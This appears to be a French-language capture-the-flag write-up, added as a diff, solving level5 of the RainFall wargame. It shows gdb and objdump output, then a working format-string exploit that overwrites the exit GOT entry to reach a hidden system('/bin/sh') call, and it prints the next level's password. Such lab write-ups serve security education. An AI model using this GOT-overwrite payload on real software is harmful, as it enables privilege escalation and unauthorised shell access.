@@ -1,0 +1,87 @@
+Meme genre de binaire que le level3
+
+Voir disas_analys
+
+(gdb) info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048334  _init
+0x08048380  printf
+0x08048380  printf@plt
+0x08048390  _exit
+0x08048390  _exit@plt
+0x080483a0  fgets
+0x080483a0  fgets@plt
+0x080483b0  system
+0x080483b0  system@plt
+0x080483c0  __gmon_start__
+0x080483c0  __gmon_start__@plt
+0x080483d0  exit
+0x080483d0  exit@plt
+0x080483e0  __libc_start_main
+0x080483e0  __libc_start_main@plt
+0x080483f0  _start
+0x08048420  __do_global_dtors_aux
+0x08048480  frame_dummy
+0x080484a4  o
+0x080484c2  n
+0x08048504  main
+0x08048520  __libc_csu_init
+0x08048590  __libc_csu_fini
+0x08048592  __i686.get_pc_thunk.bx
+
+On constate un call de system qui prend "/bin/sh" cependant comme cette fonction est jamais appeller il est difficile d'arriver dans cette sections du binaire
+
+Cependant en si on fake le call de exit en lui indicant une redirection vers la fonction o au lieu de quiter le programme on pourra rentrer dans la fonction o
+
+pour ce faire il nous faut l'addresse de la sortie de exit. et l'addresse de o
+
+pour l'adresse de o on la deja grace a info functions via gdb 0x080484a4. et pour exit faut utiliser objdump parce que si on recupere l'addresse comme celle de o on aura l'addresse de la fonction exit et non pas l'adresse du GOTO (la redirection)
+
+level5@RainFall:~$ objdump -R level5 | grep exit
+08049828 R_386_JUMP_SLOT   _exit
+08049838 R_386_JUMP_SLOT   exit
+
+on garde la deuxieme 08049838
+
+maintenant on va essayer de segfault le binaire, intuitivement on fait comme les levels precedent
+
+level5@RainFall:~$ ./level5
+%n
+Segmentation fault (core dumped)
+
+Maintenant on commence notre petite modif on va essayer de recup la position de l'adresse qui segfault
+
+level5@RainFall:~$ cat /tmp/run - | ./level5
+BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078
+
+Donc on 4 bytes de diff.
+
+Maintenant on va faire notre injection on va convertir en little endian l'addresse du GOTO de exit et convertir celle de o en decimal
+\x38\x98\x04\x08 pour GOTO de exit puis en decimal pour o 134513828
+
+on va sub 4 a 134513824 car notre addresse est de 4 bytes. Ce qui nous donne
+
+python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/run
+
+on test
+
+cat /tmp/run - | ./level5
+
+La si c'est long c'est normal car on parcourt enormement de bytes d'une valeur egal a la decimal passer en param
+
+En principe on a un 512 qui va etre afficher a un moment puis le programme va cesser de mouliner
+
+Donc la je test un whoami
+
+              512
+whoami
+level6
+
+Ca fonctionne, du coup
+
+level6
+cat /home/user/level6/.pass
+d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
